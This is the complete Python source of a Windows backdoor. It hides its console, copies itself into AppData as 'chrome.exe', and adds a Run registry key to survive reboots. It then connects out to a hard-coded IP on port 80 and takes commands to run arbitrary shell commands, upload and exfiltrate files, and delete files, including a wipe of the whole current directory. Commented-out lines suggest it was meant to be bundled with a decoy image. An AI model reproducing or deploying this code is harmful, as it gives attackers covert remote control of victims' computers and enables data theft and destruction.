import socket
import subprocess
import os
import base64
import json
import time
import shutil
import sys
import ctypes
# print("scanning you computer don't do stop... ")
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )
# file_name=sys._MEIPASS+'/SAMPLE.jpg'
# subprocess.Popen(file_name,shell=True)
class door:
    def net_cheak(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect(("192.168.43.91", 80))
            return self.send()
        except:
            time.sleep(10)
            return self.net_cheak()

    def presistance(self):
        file_location=os.environ['appdata']+"\\chrome.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v doorsedatapy /t REG_SZ /d "' + file_location + '"',shell=True)

    def join_command(self,path):
        value = ''
        for i in range(len(path)):
            try:
                da = path[i + 1]
                value = value + da + ' '
            except IndexError:
                return value
    def delete_all(self):
        path=subprocess.check_output('cd', shell=True).decode()
        var = os.listdir(path.replace('\r\n',''))
        i=0
        try:
            try:
                while True:
                    os.remove(var[i])
                    i = i + 1
            except IndexError:
                return "Delete Successfully".encode()
        except:
            return "[+]PermissionError".encode()

    def delete(self,path):
        try:
            value = self.join_command(path)
            os.remove(value)
            return '[+]Delete successfully'.encode()
        except PermissionError:
            return '[+]PermissionError'.encode()

    def cheack_directory(self,path):
        value=self.join_command(path)
        os.chdir(value)
        return subprocess.check_output('cd',shell=True)
    def read(self,path):
        value=self.join_command(path)
        with open(value,'rb') as file:
            return base64.b64encode(file.read())

    def wirte(self, title, content):
        with open(title, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+]Upload successfull!"

    def excute(self,command):
        try:
            if command[0] == 'exit':
                self.connection.close()
                exit()
            if command[0] == 'uname':
                response_value = os.getlogin().encode()
            elif command[0] == 'delete' and command[1] == '*':
                response_value = self.delete_all()
            elif command[0] == 'delete':
                response_value = self.delete(command)
            elif command[0] == 'cd' and len(command) > 1:
                response_value = self.cheack_directory(command)
            elif command[0] == 'download':
                response_value = self.read(command)
            elif command[0] == 'upload':
                response_value = self.wirte(command[1], command[2]).encode()
            else:
                v = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                (output, err) = v.communicate()
                response_value = output

        except Exception:
            response_value="[+]Unknown command".encode()
        self.box_send(response_value.decode())


    def box_send(self,command):
        json_data=json.dumps(command)
        self.connection.send(json_data.encode())

    def box_recive(self):
        json_data=''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send(self):
         while True:
             command = self.box_recive()
             self.excute(command)

final=door()
final.net_cheak()